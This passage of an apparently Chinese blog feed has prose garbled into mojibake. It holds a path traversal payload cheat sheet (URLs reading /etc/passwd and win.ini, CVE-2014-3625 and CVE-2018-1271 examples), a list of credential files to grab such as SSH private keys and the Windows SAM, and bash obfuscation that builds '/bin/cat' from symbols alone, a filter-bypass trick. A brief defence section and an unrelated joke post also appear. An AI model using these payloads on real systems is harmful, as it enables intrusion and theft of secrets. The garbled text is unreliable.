class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;doc&#x2F;index?md&#x3D;diagnose_api&amp;app&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;pcheck&#x2F;index.php?action&#x3D;showPcheck&amp;report&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;xx&#x2F;img.php?s&#x3D;16,40&amp;n&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;2xx.xx.xx.xx:8080&#x2F;xampp&#x2F;showcode.php&#x2F;c:xampp&#x2F;htdocs&#x2F;xampp&#x2F;showcode.php?showcode&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;xx.xx.com&#x2F;static&#x2F;images&#x2F;couch-ipad.png..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;frame_scc&#x2F;downLoad?template&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.12.22.xx&#x2F;downloadFile.do?fileName&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="CVE-2014-3625"><a href="#CVE-2014-3625" class="headerlink" title="CVE-2014-3625"></a>CVE-2014-3625</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;passwd </span><br><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="CVE-2018-1271"><a href="#CVE-2018-1271" class="headerlink" title="CVE-2018-1271"></a>CVE-2018-1271</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;spring-mvc-showcase&#x2F;resources&#x2F;xxx&#x2F;..%5c&#x2F;..%5c&#x2F;..%5c&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h3 id="è·¯å¾„éå†æ£€æµ‹"><a href="#è·¯å¾„éå†æ£€æµ‹" class="headerlink" title="è·¯å¾„éå†æ£€æµ‹"></a>è·¯å¾„éå†æ£€æµ‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)</span><br><span class="line">&#x2F;proc&#x2F;mounts</span><br><span class="line">&#x2F;proc&#x2F;config.gz&#x2F;etc&#x2F;my.cnf</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD</span><br><span class="line">C:\Windows\php.in</span><br><span class="line">C:\Windows\my.ini</span><br><span class="line">C:\boot.int</span><br><span class="line">C:\Windows\System32\inetsrc\MetaBase.xml</span><br><span class="line">C:\Windows\repair\sam</span><br><span class="line">..&#x2F;..&#x2F;ierp&#x2F;bin&#x2F;prop.xml</span><br></pre></td></tr></table></figure><h3 id="é˜²å¾¡-1"><a href="#é˜²å¾¡-1" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apache</span><br><span class="line">åœ¨httpd.confæ–‡ä»¶ä¸­æ‰¾åˆ°   Options +Indexes +FollowSymLinks +ExecCGI  å¹¶ä¿®æ”¹æˆ   Options -Indexes+FollowSymLinks +ExecCGI  å¹¶ä¿å­˜</span><br><span class="line"></span><br><span class="line">Tomcat</span><br><span class="line">ä¿®æ”¹conf&#x2F;web.xmlï¼Œå°†true æ”¹ä¸ºfalse é‡å¯tomcat</span><br><span class="line"></span><br><span class="line">IIS</span><br><span class="line">1ã€åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ‰“å¼€ æ§åˆ¶é¢æ¿ --&gt;ç®¡ç†å·¥å…·--&gt; IISç®¡ç†å™¨</span><br><span class="line">2ã€å³å‡»é»˜è®¤ç½‘ç«™ --&gt; å±æ€§--&gt; ä¸»ç›®å½• --&gt;å–æ¶ˆâ€œç›®å½•æµè§ˆâ€å¤é€‰æ¡†</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ™ºæ…§çš„æ”¶è— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°è°ˆæ€§çŸ¥è§‰åå·®å¯¼è‡´èœœæ±è‡ªä¿¡</title>
      <link href="2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/"/>
      <url>2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>äººç”Ÿä¸‰å¤§é”™è§‰ï¼šğŸ“±æŒ¯åŠ¨ã€ğŸ‘´èƒ½åæ€ï¼ˆğŸ‘´ç¡®å®å¯ä»¥åæ€ï¼Œç¡®å®å¯ä»¥å•Šï¼ï¼‰ã€å¥¹å–œæ¬¢ğŸ‘´</p><p>â€Taå–œæ¬¢ğŸ‘´ä¸ºç”šä¹ˆè¿˜ä¸æ‰¿è®¤â€œï¼Œæˆ–è®¸å¯ä»¥ç”¨æ€§çŸ¥è§‰åå·®æ¥è§£é‡Šã€‚</p><p>è™½ç„¶æŒ‰ç†æ¥è¯´â€Taæ˜æ˜æš—æ‹æˆ‘ï¼Œå°±æ˜¯ä¸è‚¯å‹‡æ•¢æ‰¿è®¤è‡ªå·±çš„æ„Ÿæƒ…â€œè¿™ç§é”™è§‰æ˜¯ä¸åˆ†ç”·å¥³çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´åŸºæœ¬ä¸Šæ˜¯ç”·æ€§å æ¯”å¤šï¼Œå¯¹äºä¸€ä¸ªæ™®é€šçš„ã€æ­£å¸¸çš„ã€å‹å¥½çš„è¡¨ç¤ºï¼Œç”·æ€§æ™®éæ€§åœ°å®¹æ˜“è¯¯è§£ä¸ºçˆ±æƒ…ï¼Œåœ¨ä¸¤æ€§ä¸­è™½ç„¶éƒ½ä¼šæœ‰è®¤çŸ¥ä¸æ­£ç¡®çš„æ—¶å€™ï¼Œä½†æ˜¯ç”·æ€§æ›´å®¹æ˜“äº§ç”Ÿè¿™ç§Taå–œæ¬¢æˆ‘çš„å¤¸å¤§å‹æ€§çŸ¥è§‰åå·®ã€‚</p><hr><p>å¿ƒç†å­¦å®¶åšè¿‡çš„ç ”ç©¶ï¼š</p><p>â€‹    æ‰¾ä¸€äº›ç”·å¥³å¤§å­¦ç”Ÿæ¥è§‚çœ‹æŸä¸ªå½•åƒï¼Œå½•åƒå†…å®¹æ˜¯ä¸€ä¸ªæ•™æˆå’Œä¸€ä¸ªå¥³å­¦ç”Ÿè°ˆè¯ï¼Œå¥³å­¦ç”Ÿæƒ³è¦è®ºæ–‡å»¶æœŸï¼Œæ•™æˆå’Œå¥³å­¦ç”Ÿäº¤æµå¾—æ¯”è¾ƒå‹å¥½ï¼Œå—·ï¼Œä¸¤ä¸ªæ¼”æŠ€å¾ˆç²¾æ¹›çš„æ¼”å‘˜ä¹Ÿæ³¨æ„äº†ä»…ä»…åªæ˜¯è¡¨ç°å‹å¥½ï¼Œä¸è¦è¡¨ç°å¾—è½»æµ®å’ŒæŒ‘é€—ã€‚</p><p>ç»“æœï¼š</p><p>â€‹    å¥³ç”Ÿä»¬ï¼šå½•åƒä¸­åªçœ‹åˆ°å¥³å­©å­çš„å‹å¥½ï¼Œå…³äºæ€§æ„Ÿã€æ€§è¯±æƒ‘è¿™ç±»çš„æ²¡çœ‹å‡ºæ¥ï¼Œè€Œç”·ç”Ÿä»¬åˆ™çº·çº·è¡¨ç¤ºçœ‹å‡ºæ¥è¿™ä¸ªå¥³å­©å­æ˜æ˜¾æœ‰æ€§æ–¹é¢çš„å±•ç°å’Œè¯±æƒ‘ã€‚</p><p>å¦å¤–çš„ä¸€ä¸ªç ”ç©¶ï¼š</p><p>â€‹    çœ‹çš„æ˜¯ä¸¤ä¸ªç”·å¥³åŒå­¦äº’ç›¸åœ¨å­¦ä¹ çš„ç…§ç‰‡ï¼Œç„¶åå›¾ç‰‡ä¸­çš„å¥³å­©å­å¯¹è¿™ä¸ªç”·çš„æœ‰æ²¡æœ‰æ„æ€ã€‚</p><p>ç»“æœï¼š</p><p>â€‹    å¤§éƒ¨åˆ†å¥³ç”Ÿçœ‹åˆ°ï¼ˆè§‰å¾—ï¼‰æ²¡æœ‰å•Šï¼Œä¸¤ä¸ªäººå¾ˆæ­£å¸¸å•Šï¼Œä½†ç”·ç”Ÿä¸€çœ‹ä¸å¯¹ï¼Œè¿™ä¸ªå¥³å­©å­å¯¹è¿™ä¸ªç”·å­©å­æœ‰æ„æ€ï¼Œæœ‰æ„æ€ï¼Œè‚¯å®šæœ‰æ„æ€å“ˆï¼Œç”·ç”Ÿä»¬æ™®éè®¤ä¸ºç…§ç‰‡ä¸­çš„å¥³å­©å­å¿ƒä¸åœ¨ç„‰ï¼Œå¿ƒä¸åœ¨å­¦ä¹ ï¼Œè¡¨ç°å‡ºäº†å¾ˆæ˜æ˜¾çš„æ€§æ„Ÿå’Œå¯¹ç”·å­©å­çš„è¯±æƒ‘ã€‚</p><hr><p>è¿™äº›åå·®ä¹Ÿå¹¶ä¸åªé€‚ç”¨äºæ™®ä¿¡ç”·ï¼ˆæ™®é€šè€Œåˆè‡ªä¿¡ï¼‰ï¼Œä¹Ÿé€‚ç”¨äºä¸€äº›å…·æœ‰è¾ƒé«˜é…å¶ä»·å€¼çš„äººï¼Œå°±æ¯”å¦‚ç”·é¢†å¯¼ï¼Œäº‹ä¸šæœ‰æˆå‹ç”·äººæ›´å®¹æ˜“äº§ç”Ÿè¿™ç§é”™è§‰ï¼Œæ¬¸ï¼ŒğŸ‘´çš„å¥³ä¸‹å±è¿™äº›äººå¯¹ğŸ‘´æœ‰æ„æ€å¥¥ï¼Œæ‰€ä»¥ä¸€äº›å·¥ä½œåœºæ™¯ä¸­çš„æ€§éªšæ‰°é—®é¢˜ä¹Ÿæºäºæ­¤ ã€‚</p><p>å¥³æ€§æ˜æ˜åªæ˜¯ä¸€ç§å‹å¥½çš„è¡¨ç¤ºï¼Œä½†å¯¹æ–¹å´å¾€å¾€å¯ä»¥è¯¯è§£ä¸ºå¥¹æ˜¯å¯¹æˆ‘å¿ƒæœ‰æ‰€å±ï¼Œæ›´æœ‰æ„æ€çš„æ˜¯ï¼Œå½“ç”·æ€§é‡åˆ°æ¼‚äº®çš„æ€§æ„Ÿçš„å¥³æ€§çš„æ—¶å€™æ›´å®¹æ˜“äº§ç”Ÿè¿™ç§åå·®ï¼Œä¸»è¦æƒ³ä¸€æƒ³ï¼Œäººå®¶æ¼‚äº®çš„å¦¹å­æ‹©å¶æ ‡å‡†éƒ½å·²ç»å¤Ÿé«˜äº†ï¼Œä¸ºç”šä¹ˆå°±è¿™ä¹ˆé‚£å•¥è€Œä¸çŸ¥å‘¢ã€‚</p><p>å…¶åŸå› å°±åœ¨äºæ¼«é•¿çš„äººç±»è¿›åŒ–è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œä¸¤æ€§ä»è¿›åŒ–çš„æ ¹æºä¸Šæ¥è®²ï¼ŒTaä»¬çš„æ€§é€‰æ‹©ã€æ‹©å¶ç­–ç•¥æ˜¯ä¸åŒçš„ï¼Œå¥³æ€§ç”±äºå­©å­çš„æŠšå…»ç­‰é—®é¢˜éœ€è¦ä¸€ä¸ªç¨³å®šæœ‰èµ„æºçš„ç”·å£«ï¼Œæ‰€ä»¥å¥³æ€§åœ¨æ‹©å¶ä¸­éƒ½æ˜¯å¾ˆæ…é‡çš„ï¼Œè€Œç”·æ€§åˆ™ä¸ç„¶ï¼ŒTaåœ¨æ•´ä¸ªç”Ÿæ®–è¿‡ç¨‹æ‰€è´Ÿæ‹…çš„å¹¶ä¸æ˜¯é‚£ä¹ˆå¤šï¼Œæ‰€ä»¥ç”·æ€§ä¼šè¿½æ±‚æ›´å¤šçš„å¼‚æ€§ï¼Œåœ¨æ›´å¤šçš„ä¸¤æ€§æ¬¢æ„‰ä¹‹ä¸­æ‰èƒ½æå‡è‡ªå·±åŸºå› ä¼ é€’ä¸‹å»çš„æ¯”ç‡ã€‚</p><p>å¯¹äºç”·æ€§è€Œè¨€ï¼ŒTaå¯¹å¥³æ€§çš„æƒ…æ„Ÿè®¤çŸ¥å®¹æ˜“çŠ¯ä¸¤æ–¹é¢é”™è¯¯ï¼Œä¸€æ˜¯å¯¹æ–¹å¯¹ğŸ‘´æ²¡æ„æ€ï¼Œè€ŒğŸ‘´è§‰å¾—å¯¹æ–¹æœ‰æ„æ€ï¼Œè¿™æ˜¯ä¸€ç§è¯¯æŠ¥ï¼Œå¦å¤–æ˜¯å¯¹æ–¹å¯¹ğŸ‘´æœ‰æ„æ€ï¼Œè€ŒğŸ‘´åˆ¤æ–­Taæ²¡æ„æ€ï¼Œè¿™æ˜¯ä¸€ç§æ¼æŠ¥ï¼Œä¸¤ç§é”™è¯¯æƒè¡¡ä¸‹æ¥ï¼Œç”·æ€§åšå‡ºçš„é€‰æ‹©æ˜¯ï¼šå®å¯è¯¯æŠ¥ï¼Œä¸å¯æ¼æŠ¥ï¼Œå®å¯é”™æ€ä¸€åƒï¼Œä¸èƒ½æ”¾è¿‡ä¸€ä¸ªã€‚</p><p>è¿›åŒ–çš„åŠ¨åŠ›è®©ç”·æ€§æŠŠä»»ä½•çš„å¥³æ€§çš„å¥½æ„Ÿéƒ½è§£é‡Šä¸ºæ€§æ–¹é¢çš„å…´è¶£ï¼Œæ‰€ä»¥æœ‰äº†å…¸å‹çš„å¾®ç¬‘å½“çˆ±æƒ…è¿™ç§ææ³•ï¼Œè¯´ç™½äº†ï¼Œè¿™ä¸€ç±»çš„ç”·æ€§å‘¢ï¼Œå°±æ˜¯ç”¨ä¸‹åŠèº«æ€è€ƒçš„åŠ¨ç‰©ã€‚</p><p>ä¸è¿‡æœ€åè¿˜æ˜¯è¯´ä¸€å¥ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç”·æ€§éƒ½æ˜¯è¿™ä¸ªæ ·å­ï¼Œæœ¬æ–‡ä¹Ÿåªæ˜¯å›¾ä¸€ä¹ï¼Œå¼€å¼€ç©ç¬‘ï¼Œè°ƒä¾ƒå‡ å¥ã€‚</p><p>å·®ä¸å¤šå¾—äº†ï¼Œæºœä¹‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çBB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›shellçš„éªšæ“ä½œ</title>
      <link href="2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="æ„é€ ä»»æ„æ•°å­—"><a href="#æ„é€ ä»»æ„æ•°å­—" class="headerlink" title="æ„é€ ä»»æ„æ•°å­—"></a>æ„é€ ä»»æ„æ•°å­—</h2><p>å¾ˆä¹…ä¹‹å‰æ— æ„é—´å‘ç° <code>$(())</code> è¿™ä¸ªå¥½ç©çš„ç©æ„å„¿ï¼Œæœ‰è¿‡ä¸€æ³¢æ·±â™‚å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">æ•°å­—  | æ„é€                                                          </span><br><span class="line">-1   | $((~$(())))</span><br><span class="line">0    | $(())                                                        </span><br><span class="line">0    | $#                                                           </span><br><span class="line">1    | $((~$(($((~$(())))$((~$(())))))))                            </span><br><span class="line">1    | $&#123;##&#125;                                                       </span><br><span class="line">2    | $((~$(($((~$(())))$((~$(())))$((~$(())))))))                 </span><br><span class="line">2    | $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))                                            </span><br><span class="line">3    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">3    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">4    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">4    | $(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))                                </span><br><span class="line">5    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;))                       </span><br><span class="line">6    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">6    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$(())))                       </span><br><span class="line">7    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">7    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))                     </span><br><span class="line">8    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">8    | $&#123;LANG:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))&#125;        </span><br><span class="line">9    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªå¾ˆç‰¹æ®Šçš„ï¼š</p><p><img src="https://i.loli.net/2021/05/03/nr3wmfpUkDPZ2Re.png"></p><p>ä¹‹å‰ä¿å­˜çš„å¥½åƒæ˜¯è¿”å› 5ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯ 4ï¼Œä¸æ¸…æ¥šä¸ºä»€ä¹ˆï¼Œæ‰€ä»¥ä¸åˆ—å…¥è¡¨ä¸­ï¼ˆåº”è¯¥æ˜¯å› ä¸º $0 è¿”å› <code>-bash</code> è€Œ <code>#</code> æ”¾åœ¨å‰é¢æ˜¯è·å– $0 çš„é•¿åº¦ï¼‰ï¼ˆè€Œä¸”åªè¦è¿™ä¸ªå­—ç¬¦å‡ºç°åœ¨æˆ‘çš„åšå®¢é‡Œé¢æˆ‘çš„åšå®¢å°±ä¼šå‡ºé—®é¢˜ï¼Œåäº†ã€‚ã€‚ã€‚ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦åŠå­—ç¬¦ä¸²   | æ„é€ </span><br><span class="line">/bin/        | $&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;</span><br><span class="line">l            | $&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):1&#125;</span><br><span class="line">ca           | $&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):2&#125;</span><br><span class="line">t            | $&#123;HOME:$((~$(()))):$&#123;##&#125;&#125;                                   </span><br><span class="line">.            | $&#123;LANG:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):1&#125;</span><br><span class="line">/bin/cat     | $&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):2&#125;$&#123;HOME:$((~$(()))):$&#123;##&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¾…è¡¥å……â€¦â€¦</p><h3 id="åˆ©ç”¨-ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°"><a href="#åˆ©ç”¨-ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°" class="headerlink" title="åˆ©ç”¨ $ ( ) # ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°"></a>åˆ©ç”¨ $ ( ) # ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°</h3><p><code>$((2#1000001)) = 53</code></p><p>å½¢å¼: <code>$((2#&#123;äºŒè¿›åˆ¶&#125;))) = &#123;å…«è¿›åˆ¶&#125;</code></p><h3 id="åˆ©ç”¨-æ„é€ ä»»æ„æ•°"><a href="#åˆ©ç”¨-æ„é€ ä»»æ„æ•°" class="headerlink" title="åˆ©ç”¨ $ ( ) ~ æ„é€ ä»»æ„æ•°"></a>åˆ©ç”¨ $ ( ) ~ æ„é€ ä»»æ„æ•°</h3><p>ä»¥ <code>$(($(($a))$(($b))$(($c))$(($d))$(($e))$(($f))))</code> ä¸ºä¾‹å­å§ï¼š</p><h4 id="å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ"><a href="#å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ" class="headerlink" title="å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ"></a>å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ</h4><p>åªè¦æœ‰ä»»æ„ <code>$(($n))</code> ä¸ºè´Ÿæ•°ï¼Œåˆ™è¡¨è¾¾å¼çš„ç»“æœä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœæ˜¯æ­£æ•°ï¼Œåˆ™æ‹¼æ¥åˆ°å‰ä¸€ä½çš„æœ«å°¾</span><br><span class="line">å¦‚æœæ˜¯è´Ÿæ•°ï¼Œåˆ™ä¸å‰é¢åˆ†å¼€</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š<code>$(($((1))$((0))$((-1))$((1))$((2))$((1))))</code> çš„æƒ…å†µï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 1 0 -1 1 2 1</span><br><span class="line">=&gt; (10) + (-1121)</span><br><span class="line">=&gt; -1111</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š<code>$(($((-1))$((0))$((-1))$((1))$((2))$((1))))</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((-<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; -1 0 -1 1 2 1</span><br><span class="line">=&gt; (-10) + (-1121)</span><br><span class="line">=&gt; -1131</span><br></pre></td></tr></table></figure><p>äº¦æˆ–è€…ï¼š<code>$(($((6))$((0))$((-1))$((1))$((-3))$((1))))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">6</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((-<span class="number">3</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 6 0 -1 1 -3 1</span><br><span class="line">=&gt; (60) + (-11) + (-31)</span><br><span class="line">=&gt; 18</span><br></pre></td></tr></table></figure><h4 id="a-ä¸º-0-çš„æƒ…å†µ"><a href="#a-ä¸º-0-çš„æƒ…å†µ" class="headerlink" title="$(($a)) ä¸º 0 çš„æƒ…å†µ"></a>$(($a)) ä¸º 0 çš„æƒ…å†µ</h4><p>å½“ <code>$(($a))</code> ä¸º 0ï¼Œä¸”å…¶å®ƒéƒ½ä¸ºéè´Ÿæ•°æ—¶ï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœæœ€åä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">f * 2 ** 0 + <span class="variable">$e</span> * 2 ** 3 + <span class="variable">$d</span> * 2 ** 6 + <span class="variable">$c</span> * 2 ** 9 Â·Â·Â·Â·Â·Â·</span></span><br><span class="line">å³ä»æœ€åçš„ $(($n)) å¼€å§‹ï¼Œå¾€å‰æ¨ï¼Œç›´åˆ°ç¬¬ä¸€ä½</span><br></pre></td></tr></table></figure><h4 id="å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ"><a href="#å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ" class="headerlink" 